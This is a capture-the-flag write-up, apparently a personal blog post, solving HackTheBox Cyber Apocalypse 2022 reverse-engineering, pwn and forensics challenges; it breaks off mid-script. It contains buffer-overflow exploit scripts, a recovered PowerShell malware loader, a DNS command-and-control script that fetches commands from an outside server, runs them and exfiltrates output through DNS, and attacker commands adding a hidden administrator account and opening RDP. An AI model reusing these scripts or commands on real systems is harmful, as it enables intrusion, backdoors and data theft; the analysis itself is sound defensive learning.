---
title:  "[CTF-Writeup] Hackthebox Cyber Apocalypse 2022"
category: posts
date: 2022-05-19
toc: true
toc_label: "Contents"
toc_sticky: true
category: Writeup
tags: [CTF, Writeup, Hackthebox]
excerpt: "Writeup of some of the challenges in the 2022 Cyber Apocalypse CTF"
---

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/eventlogo.png" alt="drawing" width="350"/>
</p>

# Reverse

## WIDE

Opening the application with ghidra and starting from the main function. Following the code to the menu function it was easy to see that, if option 6 was selected a password was requested and the input compared with the string "sup3rs3cr3tw1d3"

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/wide_1.png" alt="drawing" width="350"/>
</p>

Launching the application and following the logic above to get me the flag.

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/wide_2.png" alt="drawing" width="350"/>
</p>

FLAG: **HTB{str1ngs_4r3nt_4lw4ys_4sc11}**

<br>
## Omega-One

After downloading all files I got an executable and a text file with an output... I tried to run the application, but I got nothing so I fired up Ghidra.
Analyzing the application I saw a function being called a lot, sometimes with the name of a "planets" and other times with a memory address to a place that had also "planet" name.

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/omega_one_1.png" alt="drawing" width="350"/>
</p>


Inspecting on of those memory addresses and besides the planet name, I also had a character
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/omega_one_2.png" alt="drawing" width="350"/>
</p>


Looking at the output file that was given, it was clear that it was the flag... I just needed to go through all the planets in this file and get the corresponding character. The result was:

```
Crerceon -              H
Ezains -                T
Ummuh -                 B
Zonnu -                 {
Vinzo -                 l
Cuzads -                1
Emoi (Emoiu) -          n
Ohols -                 3
Groz'ens -              4
Ukox (&DAT_00102234) -  r
Ehnu (DAT_00102269)-    _
Pheilons -              t
Cuzads -                1
Khehlan -               m 
Ohols -                 3
Ehnu -                  _
Munis -                 b
Inphas -                u 
Pheilons -              t
Ehnu -                  _
Dut (DAT_00102174) -    p              
Ukox -                  r
Ohols -                 3
Pheilons -              t
Pheilons -              t
Zimil -                 y
Ehnu -                  _
Honzor -                s
Vinzo -                 l
Ukteils -               0
Falnain -               w
Dhohmu -                !
Baadix -                }
```

FLAG - **HTB{l1n34r_t1m3_but_pr3tty_sl0w!}**



## Rebuild

After downloading the challenge I started analyzing it with Ghidra. I started changing variable names accordingly to make it easier to keep track of things.
For the input it was clear that I needed a 32 char input otherwise I would get an error message saying that the password length was incorrect.

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_1.png" alt="drawing" width="350"/>
</p>


Continuing debugging, there was an array called encrypted being cored with a key

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_2.png" alt="drawing" width="350"/>
</p>


I got both values and tried myself, but for some reason I got nothing! So I decided to run the app with GDB and set a breakpoint in asleep, that way I could get the xored values from memory since it would be stored in a register.

Started the application with 32 "A" chars as input and when the breakpoint was hit I got the first letter of the flag

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/rebuild_3.png" alt="drawing" width="350"/>
</p>

0x48 -> H

Continuing until I hit the end of the execution and the result was
```
0x48 0x54 0x42 0x7b 0x68 0x31 0x64 0x31 0x6e 0x67 0x5f 0x31 0x6e 0x5f 0x63 0x30 0x6e 0x73 0x74 0x72 0x75 0x63 0x74 0x30 0x72 0x35 0x5f 0x31 0x6e 0x31 0x74 0x7d 
```


Wrote a simple script to get the flag from the hex output

```python
encoded_flag = [0x48, 0x54, 0x42, 0x7b, 0x68, 0x31, 0x64, 0x31, 0x6e, 0x67, 0x5f, 0x31, 0x6e, 0x5f, 0x63, 0x30, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x30, 0x72, 0x35, 0x5f, 0x31, 0x6e, 0x31, 0x74, 0x7d]
 
flag = ""
for c in encoded_flag:
	flag += chr(c)
	
print(flag)
```

FLAG: **HTB{h1d1ng_1n_c0nstruct0r5_1n1t}**


## Snakecode

Downloaded the pyc file... using uncompyle6 i decompiled it back to py file

```python
import marshal, types, time, zlib  
ll = types.FunctionType(marshal.loads(('YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB\nAIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl\nc3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK\nAAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA\ncwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA\n').decode('base64')), globals())  
i0 = ll('eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB\nCKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh\n')  
i1 = ll('eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB\nCKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1\n')  
f0 = ll('eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz\n8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5\n')  
f1 = ll('eJxLZmRgYIBhZyAu5gISNQwMWQwMzQwMwRogcT8wWcIKJNJTS5IzIFxmIFGemacBpBjARDE7kLAp\nLknJzLMr4QCxcxJzk1IS7cDKQSoAvuUPJw==\n')  
f2 = ll('eJx1kL1uwkAQhOfOBsxPQZUmL+DOEnWUBghEQQbFIESVglUkY5ECX+lHoMz7Jrt7HCgSOWlGO/rm\n1tbtIwBBY1b9zdYYkEFlcRqiAQoWxaginDJhjcUBijNQy+O24jxgfzsHdTxOFB8DtoqPoK7HPcXn\ngCPFZ1BfcUGsdMA/lpc/fEqeUBq21Mp0L0rv/3grX/f5aELlbryVYzbXZnub7j42K5dcxslym7vu\nJby/zubrK1pMX9apPLOTraReqe9T3SlWd9ieakfl17OTb36OpFE/CDQDE5vHv7K/FKBNmA==\n')  
f3 = ll('eJxVj00KAjEMhV+b8Q9040IZT9C9WxHEvRvBC1iFUhhk2sUIIwgexLWn1KQzI9qSl/DlhaZHDSDj\nII4tR3ix1IBVyK1GXitImt/0l1JDSSih1rAZfIZyI4x9BRIkeKA8SLeF1Dl9clIHG+c9OakdZ35O\nT/o+yiciZI2Hgvpt702Pt925Nx/HFZwSGbIYqaL87FS5aKSIgi5JbZR/F1WTrkZmk4QByypE64p1\nap6X4g8LaaoZ3zFGfzFVE/UBTuovhA==\n')  
f4 = ll('eJw1zDsKgEAMBNCJilb2drZ7AEuxsbfxBOIHFFkWNqWdF3eyYJEXkgxZcwB/jazYkkdwUeAVCAcV\nW3F4MjTt7ISZyWVUS7KEsPtN7cW9e2ddLeKTIXk7gkSsSB91O/2g9uToLBELO0otH2W6Ez8=\n')  
f5 = ll('eJxdjr0OwjAMhM9J+as6M7HTF0AsiKV7F54ACJUKVaiSjOnEi2MbISQGf4rtu3OuMwBSBVfDFQdG\nBhzwMAgNMsER1s58+wJ3Hlm4Ai/z33YGE+A1IrNljnBBtiLYT1ZSf2sr6lMt19u+ZPYQkGDJqA0j\nycfap7+lBT/C2bveJ/UkEQ7KqByTGMbPKNQSpojiPMTEzqNKup2aKlnShramopJW5g2ipyUM\n')  
f6 = ll('eJxdjTEOglAQRB98iMbEKxhLbkBjaLSwsrHWBEUJCRKULTT5VFzc3W9nMS+zk93ZqwNS1UK1VQ17\nRQ0CVcQUsTvljO4vWjEmSIRP8A4PXn3MlHKOea4DlxyzWMsOjXUHK/bpVXb1TWy855kF2gN9SPo2\nDD9+At8Zdm4YZorNIFXTFTI335aPS1UWtie28QV3xx4p\n')  
f7 = ll('eJxtjz8LwjAQxV/S1mrRxcnZKat/qyAuOrv0E4ilIJRS2hsUCg7OfmcvubZTIe/97nKPcHkEADpd\nWPWPjYCGj0Kj0fjIfHwVqiWIbzxbJ6SHEleQ1yf8ocQHFLSJqgKN+nTYVUUEGndNCiRG8UY3M7F7\nabb7TrAS7AVrQSw4CDaCreBo7CfJPvdy/nZeummZuyY3bHBWh2ynmtJncXaRLLaJem6HaqGiVlMV\n6Zn+Azn/L1k=\n')  
f8 = ll('eJwljr0KAkEMhCf3o2hrIb7BlWIhFiKC1jYWViKHe+qKnHob0GKt7sVNcsV8ZDeTSc45gJ5oINqI\nwkkQgTvQAvRdgwmO0BK2xxl+uTUTxBwugUtxT8EZIiHKZ4o21dZE7FLRe4yD+nMLixlchvG+0KU7\nPxR6EVjhSVDoKazt86MqG6uasr5WrI3SucCNbJPEp685keIy576aqktThVs3r0kf48s8r4c9Ogaj\nL3SnIej8MrDz9aqLXJhPzwMNaURT4R/aUC0X\n')  
a1 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWwNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\nm5SSaAdWDFIBALI0C1U=\n')  
a2 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\nm5SSaAdWDFIBALBMC00=\n')  
a3 = ll('eJw10EtLw0AUBeAzTWLqo74bML8gSyFdiotm40rEZF+kRyVtCGKmqzar/nHvHBDmfty5c+fBrB2A\niUVuUVkMG4MOnIARGIMJeAKm4BQ8Bc9UsfwcvABn/5VL8Aq81tINeAveKb/Hd47R4WDDTp5j7hEm\nR4fsoS4yu+7Vh1e8yEYu5V7WciffZCl/5UpW8l162cuF3Mq1fJSUY5uYhTZFRvfZF+EvfOCnU89X\ngdATGFLjafBs+2e1fJShY4jDomvcH1q4K9U=\n')  
a4 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcRQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\nm5SSaAdWDFIBALCJC04=\n')  
a5 = ll('eJxNzTELwjAQBeCXS4r6TzKJP6DUgruLq0s1S7BKIRkqJP/dd3Hp8D4ex3H3NAA6xjEXJo2kAHeH\nalAF1aI6FINg8BIsZxTZdM5lM2/95i2PXCNBPBCvzeubLOR4yvp2bX6bS3P+LyppR/qUQ/wMea99\nnt6PMA26l/SKxQ/XGxky\n')  
a6 = ll('eJwlzLsKwkAQheF/L0afw2qr4AOENOnT2NpEgyDGENgtFHbfPTNrcT6G4cw8DHCQeMkgiWchw81T\nDMVSHMWTDdnytGTHu+Ea9G4MAkHPkxXaS9L1t/qrbtXlX1TiUehiml9rn046L9PnPk+99qJ+cewN\nxxM9\n')  
a7 = ll('eJwlzLEKwjAQxvF/rhF9jk6Zig8gXdy7uLq0FqFYRUiGFpJ39y4O34/j+O4eDjhovOaqia2S4e4p\njiKUhuLJjiw8hex5Cbdgd0NQCHaeROnOydZbda9+q+u/aMSjcolpXj59Otm8ju9pHnvrRfvS8AMM\nqhM6\n')  
a8 = ll('eJxLZmRgYABhJiB2BuJiPiBRw8CQwsgglsLEkM3EEKzBDBTyy2QFkplAzKABJkCaSkBEjgZcsJgd\nSNgUl6Rk5tmVcIDYOYm5SSmJdmDFIBUAVDAM/Q==\n')  
a9 = ll('eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcQQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY\nm5SSaAdWDFIBAK+VC0o=\n')  
m0 = ll('eJw1jTELwjAUhC9Jq/0VzhldBAfr4u7i6mYpFFSKCXRJp/7x3rsi5L5Avnsvrx0AS8PcmNQSGSg8\nDsWjBJQKS42nxwzMQSog09b/gsrs9AGP6LjhHr3tMfSn7TpH+yebfYtJHGXH7eknTpGAkPbEJeVu\n+F5V/Bw1Wpl0B7cCYGsZOw==\n')  
m1 = ll('eJw1zUEKAjEMBdCfdMQreIRuRwU3Mhv3bjzCDAOCitCAm7rqxU1+cZGX0v408wbAvy5e5eQYUAUm\nqAnNHdASvsJLhSVUBpryoPG6Km5ZfPaah/hBnXXf29jbsbdDjl0W2Tdd6IN+6JwdkLJ1zsWW+2vi\n/HOMRIklkJ38AF2QGOk=\n')  
m2 = ll('eJxNjj8LAjEMxV96fz+Fk0NHdT5c3F1cD5c7BEHlsAWXdrov7kuKICS/0LyXpFMP4JcnZrgSEUgM\nQXJIDVKLtcHokAWZKvsVUm0eGjr1rC3GCplBW/03Xpy2hM5bj4sXnjh7p4cUz30pO6+fiKouxtn6\ny8MehcH4MU7GtydgCB0xhDjfX8ey8mAzrYqyka18AW5IIKw=\n')  
  
def snake(w):  
    r = i0()  
    c = i1()  
    f0(w)  
    d = (0, 1)  
    p = [(5, 5)]  
    pl = 1  
    s = 0  
    l = None  
    while 1:  
        p, d, pl, l, s, w, c, r = m2(p, d, pl, l, s, w, c, r)  
        time.sleep(0.4)  
  
    return  
  
  
i1().wrapper(snake)
```


Running it and it was the snake game... it is fun but it wont help with the challenge.

I started a python2 (the application runs python2) shell and I loaded the initial variables that were marshelled at the beginning.
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/snakecode_1.png" alt="drawing" width="350"/>
</p>

Then I imported **dis**, that will allow to disassemble the marshalled code. Using dis. Dis (variable), I went through all the variables to one of those gave me the flag

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/snakecode_2.png" alt="drawing" width="350"/>
</p>


FLAG: **HTB{SuP3r_S3CRt_Sn4k3c0d3}**



## Without a trace

After downloading the file, I opened up Ghidra and started analyzing it. Following the code I got to a check_password function

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/without_a_trace_1.png" alt="drawing" width="350"/>
</p>

There was a ptrace, which is one of the most basic ways of preventing a program from being debugged in Linux, and given the challenge name.... well, I fired GDB and in order to bypass this I set

```
catch syscall ptrace
```

This would break when the syscall ptrace is executed. When it happened I used

```
set $rax=0
nexti
```

I had to repeat it once again
```
set $rax=0
nexti

and finally the flag appeared

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/without_a_trace_2.png" alt="drawing" width="350"/>
</p>


FLAG: **HTB{tr4c3_m3_up_b4_u_g0g0}**

## Teleport

After downloading all files, I started analyzing the application. 
Fired Ghidra and since the application was stripped, I search for the term "something wrong" which was the output of the program when I executed it, and saw that it was looping through an array 
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_1.png" alt="drawing" width="350"/>
</p>

There were a lot of functions in it

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_2.png" alt="drawing" width="350"/>
</p>

each one was comparing a letter and if it was true, it was calling the method longjmp with a position number (index)
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/rev/teleport_3.png" alt="drawing" width="350"/>
</p>

I started asking "could this be the letter of the flag and its position?"... Got all letters and their respective position

```
char index

c     33

_     21

0     34

t     13

u     40

p     8

m     30

h     19

1     29

m     41

r     15

n     35

B     3

H     1

c     25

_     12

_     27

p     7

}     100

t     28

_     17

1     37

u     39

t     18

p     23

t     36

3     26

n     38

1     9

{     4

s     22

!     42

T     2

n     10

3     31

g     11

h     14

u     16

_     32

h     5

0     6

4     24

3     20
```

Putting it all together, I got the flag!
FLAG: **HTB{h0pp1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!}**


# PWN

## Entry point

Started by running the app and after a while I saw that it was just asking me for either a card scan or a password. So, checking with ghidra (changed variable names for clarity) made it easy to see that scanning the card wouldn't do much because the if statement will compare "code" with a string, and the code hasn't been changed after it's been allocated, so I focused on the "check_pass" function...

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_1.png" alt="drawing" width="350"/>
</p>


This method is also simple to check once I had renamed some variables

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_2.png" alt="drawing" width="350"/>
</p>


It was reading 15 characters from the user input and comparing it with the first 15 char of the string "0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455" and if it was equal it would quit! So this comparison had to fail! Using a random value got me the flag

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/entry_point_3.png" alt="drawing" width="350"/>
</p>


FLAG: **HTB{th3_g4t35_4r3_0p3n!}**

## Going deeper

Running the application with ltrace I saw that it was comparing the input username with the string DRAEGER15th30n34nd0nly4dm1n15tr4  but even with this, I was getting an error.

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_1.png" alt="drawing" width="350"/>
</p>

Firing up Ghidra and analyzing the application, I realized that because the variable used to store the user input was only 40 bytes and a total of 57 bytes were being stored in the read function.


<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_2.png" alt="drawing" width="350"/>
</p>

Since it was using strcmp which will compare strings until it finds a NULL character I just needed to add \x00
The string that was being compared was 52 bytes, so If I filled the rest of the buffer with  \x00 it would be enough so testing it locally I got the fake flag... so using the same code I tested it remotely to get the real flag

```python
#!/usr/bin/env python

from pwn import *


offset = 53

p = process("./sp_going_deeper")
# p = remote("165.22.119.112", 30453)

shellcode = "\x00"

# exploit code
p.recvuntil(">>")
p.sendline("1")

p.recvuntil("Input:")

payload = "DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft" + shellcode
info("Sending {0} bytes as payload ...".format(len(payload)))
p.sendline(payload)

line = str(p.recvall(), "utf-8)")
print(line)
p.kill
```

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_3.png" alt="drawing" width="350"/>
</p>


Another way I found to get the flag, was to simply send 53 "A" and trigger a buffer overflow with the last 4 bytes overwriting the param3 
```pyhthon
#!/usr/bin/env python
from pwn import *


offset = 53

p = process("./sp_going_deeper")
# p = remote("165.22.119.112", 30453)

shellcode = "\xef\xbe\x37\x13"
# exploit code
p.recvuntil(">>")
p.sendline("1")

p.recvuntil("Input:")

payload = "A"*offset + shellcode

info("Sending {0} bytes as payload ...".format(len(payload)))
p.sendline(payload)

line = str(p.recvall(), "utf-8)")
print(line)
p.kill
```

Testing it remotely 
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/pwn/going_deeper_4.png" alt="drawing" width="350"/>
</p>


FLAG: **HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}**

# Forensics

## Golden persistence

Downloaded the NTUSER.DAT file and went to my windows VM. 
Using RegRipper rr.exe and analyzing the output file I was able to see an interesting powershell command

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_1.png" alt="drawing" width="350"/>
</p>



Using cyberchef I decoded the payload and got a powershell script that needed to be formatted first...

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_2.png" alt="drawing" width="350"/>
</p>


Every 3 points in a row is a point, every other point is nothing... so at the end I got
```powershell
function encr {

param(

[Byte[]]$data,

[Byte[]]$key

)

[Byte[]]$buffer = New-Object Byte[] $dataLength

$dataCopyTo($buffer, 0)

[Byte[]]$s = New-Object Byte[] 256;

[Byte[]]$k = New-Object Byte[] 256;

for ($i = 0; $i -lt 256; $i++)

{

$s[$i] = [Byte]$i;

$k[$i] = $key[$i % $keyLength];

}

$j = 0;

for ($i = 0; $i -lt 256; $i++)

{

$j = ($j + $s[$i] + $k[$i]) % 256;

$temp = $s[$i];

$s[$i] = $s[$j];

$s[$j] = $temp;

}

$i = $j = 0;

for ($x = 0; $x -lt $bufferLength; $x++)

{

$i = ($i + 1) % 256;

$j = ($j + $s[$i]) % 256;

$temp = $s[$i];

$s[$i] = $s[$j];

$s[$j] = $temp;

[int]$t = ($s[$i] + $s[$j]) % 256;

$buffer[$x] = $buffer[$x] -bxor $s[$t];

}

return $buffer

}

  
  

function HexToBin {

param(

[Parameter(

Position=0,

Mandatory=$true,

ValueFromPipeline=$true)

]

[string]$s)

$return = @()

for ($i = 0; $i -lt $sLength ; $i += 2)

{

$return += [Byte]::Parse($sSubstring($i, 2), [System.Globalization.NumberStyles]::HexNumber)

}

Write-Output $return

}

  

[Byte[]]$key = $encGetBytes("Q0mmpr4B5rvZi3pS")

$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s)t3RBka5tL

$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen)uLltjjW

$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq)uY4S39Da

$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG)Kb19fyhl

$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O)jH54NW8C

$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"

$enc = [SystemTextEncoding]::ASCII

[Byte[]]$data = HexToBin $encrypted

$DecryptedBytes = encr $data $key

$DecryptedString = $encGetString($DecryptedBytes)

$DecryptedString|iex
```

The script is using registry properties to get its values for building the encrypted variable. Using a demo version of RegistryViewer, I opened the NTUSER.DAT and one by one i copied the values until it looked like this

```powershell
[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = "F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39"
$encrypted2 = "CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1"
$encrypted3 = "C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D"
$encrypted4 = "D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1"
$encrypted5 = "84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [System.Text.Encoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString
```
After this, i just ran the poweshell script and got the flag


<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/golden_persistence_3.png" alt="drawing" width="350"/>
</p>


FLAG: **HTB{g0ld3n_F4ng_1s_n0t__st34lthy_3n0ugh}**



## Automation

Once I downloaded the pcap file, I used strings over and I saw a big base64 string... decoding it gave me a ps1 script

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_1.png" alt="drawing" width="350"/>
</p>

After decoding it i got
```powershell
function Create-AesManagedObject($key, $IV) {

$aesManaged = New-Object "System.Security.Cryptography.AesManaged"

$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC

$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros

$aesManaged.BlockSize = 128

$aesManaged.KeySize = 256

if ($IV) {

if ($IV.getType().Name -eq "String") {

$aesManaged.IV = [System.Convert]::FromBase64String($IV)

}

else {

$aesManaged.IV = $IV

  

}

}

if ($key) {

  

if ($key.getType().Name -eq "String") {

$aesManaged.Key = [System.Convert]::FromBase64String($key)

}

else {

$aesManaged.Key = $key

}

}

$aesManaged

}

  

function Create-AesKey() {

$aesManaged = Create-AesManagedObject $key $IV

[System.Convert]::ToBase64String($aesManaged.Key)

}

  

function Encrypt-String($key, $unencryptedString) {

$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)

$aesManaged = Create-AesManagedObject $key

$encryptor = $aesManaged.CreateEncryptor()

$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);

[byte[]] $fullData = $aesManaged.IV + $encryptedData

$aesManaged.Dispose()

[System.BitConverter]::ToString($fullData).replace("-","")

}

  

function Decrypt-String($key, $encryptedStringWithIV) {

$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)

$IV = $bytes[0..15]

$aesManaged = Create-AesManagedObject $key $IV

$decryptor = $aesManaged.CreateDecryptor();

$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);

$aesManaged.Dispose()

[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)

}

  

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }}

$key = "a1E4MUtycWswTmtrMHdqdg=="

$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;

for ($num = 0 ; $num -le $out.Length-2; $num++){

$encryptedString = $out[$num].Strings[0]

$backToPlainText = Decrypt-String $key $encryptedString

$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32

Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189

for ($ans = 0; $ans -lt $pr.length-1; $ans++){

$domain = -join($pr[$ans],".windowsliveupdater.com")

Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189

}

Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189

}
```

This script was requesting a DNS TXT to a server with the IP 147.182.172.189.
Using the wireshack filter **dns && ip.dst == 147.182.172.189** I started following some of the requests until I found an interesting one

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_2.png" alt="drawing" width="350"/>
</p>

I then went to the windows VM and edited the initial script so i could run this base64 strings and decrypt its content
(only the edited part)
```powershell
$key = "a1E4MUtycWswTmtrMHdqdg=="
# $out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
$out = @("Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=", "hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=", "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=", "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru", "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=", "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=", "A@M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh")
$result = ""
for ($num = 0 ; $num -le $out.Length-2; $num++){
# $encryptedString = $out[$num].Strings[0]
$encryptedString = $out[$num]
$backToPlainText = Decrypt-String $key $encryptedString
# $output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
$result = $result + $backToPlainText
# Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
# for ($ans = 0; $ans -lt $pr.length-1; $ans++){
# $domain = -join($pr[$ans],".windowsliveupdater.com")
# Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
}
$result
```

the result was a list of commands that were run...
```
hostname
whoami
ipconfig
wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value
net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr
netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
```


Base64 decode the password got me the first part of the flag
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_3.png" alt="drawing" width="350"/>
</p>


Looking at the rest of the script I saw that it was encrypting each command response and parsing it into hex and storing it in an array. It was then making a DNS request with each hex from the total array of responses as a "subdomain"

<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_4.png" alt="drawing" width="350"/>
</p>

I went back to wireshark and filtered for DNS once again and saved the filtered pcap. Than with strings command I did **strings -n8 test.pcap** revealing all hex
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_5.png" alt="drawing" width="350"/>
</p>

I used python to parse this and eliminate duplicates and output a base64 encode.
```python
import base64

  

unique_lines = []

with open("dup_hex", "r") as f:

lines = f.readlines()

lines = [line.rstrip() for line in lines]

for line in lines:

if line not in unique_lines:

unique_lines.append(line)

  
result=""
for line in unique_lines:
